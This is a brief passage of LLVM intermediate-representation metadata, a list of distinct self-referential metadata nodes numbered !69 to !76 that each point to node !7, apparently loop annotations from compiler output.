!69 = distinct !{!69, !7}
!70 = distinct !{!70, !7}
!71 = distinct !{!71, !7}
!72 = distinct !{!72, !7}
!73 = distinct !{!73, !7}
!74 = distinct !{!74, !7}
!75 = distinct !{!75, !7}
!76 = distinct !{!76, !7}
